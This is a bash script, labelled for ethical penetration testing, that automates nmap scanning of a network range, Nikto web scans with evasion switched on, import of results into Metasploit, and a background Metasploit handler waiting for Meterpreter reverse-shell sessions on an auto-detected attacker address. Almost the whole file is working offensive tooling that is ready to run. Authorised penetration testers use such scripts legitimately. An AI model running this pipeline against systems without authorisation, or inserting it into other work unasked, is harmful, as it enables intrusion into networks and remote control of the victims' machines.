#!/bin/bash

# Automated Nmap Discovery + Nikto Web Scan + Metasploit Handler
# For ethical penetration testing only!

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_range> (e.g., 192.168.1.0/24 or 10.0.0.0/24)"
    exit 1
fi

TARGET_RANGE=$1
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="scan_results_${TIMESTAMP}"
mkdir -p "$OUTPUT_DIR"

NMAP_XML="$OUTPUT_DIR/nmap_scan.xml"
WEB_HOSTS="$OUTPUT_DIR/web_hosts.txt"

# Auto-detect attacker IP
LHOST=$(ip route get 1 | awk '{print $7}' | head -1)
LPORT=4444
PAYLOAD="windows/x64/meterpreter/reverse_tcp"  # Adjust for Linux if needed

echo "[+] Starting discovery scan on $TARGET_RANGE"
nmap -sV -O -p 80,81,443,444,8000,8080,8081,8443 --open "$TARGET_RANGE" -oX "$NMAP_XML" -oN "$OUTPUT_DIR/nmap_full.txt"

echo "[+] Extracting web servers (HTTP/HTTPS ports)"
# Grep common web ports that are open
grep -E 'portid="(80|81|443|444|8000|8080|8081|8443)"' "$NMAP_XML" | grep open | \
    awk -F'[ />]' '{print $6 "\t" $10}' | sort -u > "$WEB_HOSTS"

if [ ! -s "$WEB_HOSTS" ]; then
    echo "[-] No web servers found on common ports."
else
    echo "[+] Found web servers:"
    cat "$WEB_HOSTS"
fi

echo "[+] Running Nikto on detected web servers"
while read -r ip port; do
    protocol="http"
    [ "$port" = "443" ] || [ "$port" = "444" ] || [ "$port" = "8443" ] && protocol="https"

    url="${protocol}://${ip}:${port}"
    nikto_output_txt="$OUTPUT_DIR/nikto_${ip}_${port}.txt"
    nikto_output_msf="$OUTPUT_DIR/nikto_${ip}_${port}.msf"
    nikto_output_xml="$OUTPUT_DIR/nikto_${ip}_${port}.xml"

    echo "[++] Scanning $url with Nikto..."
    nikto -h "$url" -output "$nikto_output_txt" -Format txt \
          -output "$nikto_output_msf" -Format msf+ \
          -output "$nikto_output_xml" -Format xml \
          -Tuning 1234567890 -evasion 1 -FollowRedirects -maxtime 300

    echo "    Results saved: $nikto_output_txt (readable), $nikto_output_msf (Metasploit log), $nikto_output_xml"
done < "$WEB_HOSTS"

echo "[+] Starting Metasploit database and importing Nmap results"
service postgresql start
msfdb init 2>/dev/null || true

msfconsole -q -x "db_import $NMAP_XML; workspace -a $TIMESTAMP; hosts; services; vulns; exit"

echo "[+] Starting reverse handler (listening on $LHOST:$LPORT)"
cat << EOF > /tmp/handler.rc
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

msfconsole -q -r /tmp/handler.rc &

echo "[+] All done!"
echo "    - Results folder: $OUTPUT_DIR"
echo "    - Review Nikto TXT files for vulnerabilities."
echo "    - MSF+ logs can be reviewed in Metasploit or manually."
echo "    - Run 'msfconsole -q -x \"workspace $TIMESTAMP; vulns -o\"' for imported data."
echo "    - Check sessions with 'msfconsole -q -x \"sessions -l\"'"

# Optional cleanup
# rm /tmp/handler.rc
